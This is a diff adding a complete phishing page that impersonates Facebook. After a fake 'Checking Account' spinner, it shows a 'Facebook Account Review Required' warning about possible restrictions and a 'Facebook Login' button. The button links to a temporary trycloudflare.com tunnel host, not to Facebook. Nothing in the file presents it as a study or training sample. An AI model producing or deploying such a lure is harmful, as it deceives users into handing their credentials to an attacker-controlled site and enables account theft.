@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Account Check</title>
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+    margin: 0;
+    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    background: #e5e7eb;
+    min-height: 100vh;
+}
+
+/* Overlay */
+.overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.45);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+}
+
+/* Modal */
+.modal {
+    background: #fff;
+    width: 100%;
+    max-width: 360px;
+    padding: 28px;
+    border-radius: 10px;
+    box-shadow: 0 12px 30px rgba(0,0,0,0.2);
+    text-align: center;
+}
+
+/* Hidden by default */
+.hidden {
+    display: none;
+}
+
+h2 {
+    margin: 0 0 10px;
+    color: #1f2937;
+    font-size: 20px;
+    font-weight: 600;
+}
+
+p {
+    margin: 0 0 20px;
+    color: #4b5563;
+    font-size: 14px;
+    line-height: 1.5;
+}
+
+/* Loader */
+.spinner {
+    width: 40px;
+    height: 40px;
+    border: 4px solid #e5e7eb;
+    border-top-color: #2563eb;
+    border-radius: 50%;
+    margin: 16px auto 0;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+/* Button */
+.action-btn {
+    display: inline-block;
+    width: 100%;
+    height: 44px;
+    line-height: 44px;
+    background: #2563eb;
+    color: #ffffff;
+    text-decoration: none;
+    border-radius: 6px;
+    font-size: 14px;
+    font-weight: 500;
+    transition: background 0.2s ease;
+}
+
+.action-btn:hover {
+    background: #1e40af;
+}
+
+@media (max-width: 480px) {
+    .modal { padding: 24px 20px; }
+    h2 { font-size: 18px; }
+    p { font-size: 13px; }
+}
+</style>
+</head>
+<body>
+
+<div class="overlay">
+
+    <!-- Loading Screen -->
+    <div class="modal" id="loadingModal">
+        <h2>Checking Account</h2>
+        <p>Please wait while we review account status.</p>
+        <div class="spinner"></div>
+    </div>
+
+    <!-- Main Prompt -->
+    <div class="modal hidden" id="mainModal">
+        <h2>Facebook Account Review Required</h2>
+        <p>
+            Your Facebook account may require verification to prevent possible restrictions.
+            Please proceed to review your account.
+        </p>
+
+        <!-- Button Link -->
+        <a href="https://deaths-sending-distributed-writer.trycloudflare.com" class="action-btn">
+            Facebook Login
+        </a>
+    </div>
+
+</div>
+
+<script>
+setTimeout(() => {
+    document.getElementById("loadingModal").classList.add("hidden");
+    document.getElementById("mainModal").classList.remove("hidden");
+}, 3000);
+</script>
+
+</body>
+</html>
